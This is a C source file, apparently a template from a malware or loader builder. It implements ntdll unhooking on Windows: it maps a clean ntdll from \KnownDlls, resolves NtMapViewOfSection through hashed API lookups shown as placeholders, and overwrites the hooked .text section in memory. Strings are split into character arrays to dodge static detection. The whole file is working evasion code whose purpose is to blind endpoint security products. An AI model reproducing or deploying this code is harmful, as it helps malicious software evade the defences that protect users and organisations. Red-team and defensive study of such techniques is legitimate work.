/*

    Original Author: SaadAhla - https://github.com/SaadAhla/ntdlll-unhooking-collection

*/

#include <Windows.h>

#include "structs.h"
#include "functions.h"
#include <stdio.h>

#pragma comment(lib, "ntdll")
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define OBJ_CASE_INSENSITIVE                0x00000040L

#define NtCurrentProcess()	   ((HANDLE)-1)
#define _CRT_SECURE_NO_WARNINGS

typedef const UNICODE_STRING* PCUNICODE_STRING;

NTSYSAPI VOID RtlInitUnicodeString(
    PUNICODE_STRING         DestinationString,
    __drv_aliasesMem PCWSTR SourceString
  );

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PCUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
    PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;


typedef NTSTATUS(NTAPI* MyNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );

NTSTATUS NtOpenSection(
    OUT PHANDLE             SectionHandle,
    IN ACCESS_MASK          DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes
);

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
    }


LPVOID MapNtdll() {

    UNICODE_STRING DestinationString;
    const wchar_t SourceString[] = { '\\','K','n','o','w','n','D','l','l','s','\\','n','t','d','l','l','.','d','l','l', 0 };

    RtlInitUnicodeString(&DestinationString, SourceString);

    OBJECT_ATTRIBUTES   ObAt;
    InitializeObjectAttributes(&ObAt, &DestinationString, OBJ_CASE_INSENSITIVE, NULL, NULL);


    HANDLE hSection;
    NTSTATUS status1 = NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObAt);
    if (!NT_SUCCESS(status1)) {
        //printf("[!] Failed in NtOpenSection (%u)\n", GetLastError());
        return NULL;
    }

    PVOID pntdll = NULL;
    ULONG_PTR ViewSize = 0;

    MyNtMapViewOfSection pNtMapViewOfSection = (MyNtMapViewOfSection)(GetProcAddressH(GetModuleHandleH(#-NTDLL_VALUE-#), #-NTMVOS_VALUE-#));
    NTSTATUS status2 = pNtMapViewOfSection(hSection, NtCurrentProcess(), &pntdll, 0, 0, NULL, &ViewSize, 1, 0, PAGE_READONLY);
    if (!NT_SUCCESS(status2)) {
        //printf("[!] Failed in NtMapViewOfSection (%u)\n", GetLastError());
        getchar();
        return NULL;
    }
    return pntdll;
}

BOOL Unhook(LPVOID module) {

    HANDLE hntdll = GetModuleHandleH(#-NTDLL_VALUE-#);

    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((char*)(module)+DOSheader->e_lfanew);
    if (!NTheader) {
        //printf(" [-] Not a PE file\n");
        return FALSE;
    }

    PIMAGE_SECTION_HEADER sectionHdr = IMAGE_FIRST_SECTION(NTheader);
    DWORD oldprotect = 0;

    for (WORD i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {

        char txt[] = { '.','t','e','x','t', 0 };

        if (!strcmp((char*)sectionHdr->Name, txt)) {
            BOOL status1 = VirtualProtect((LPVOID)((DWORD64)hntdll + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!status1)
                return FALSE;

            memcpy((LPVOID)((DWORD64)hntdll + sectionHdr->VirtualAddress), (LPVOID)((DWORD64)module + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize);

            BOOL status2 = VirtualProtect((LPVOID)((DWORD64)hntdll + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!status2)
                return FALSE;

        }
        return TRUE;
    }

}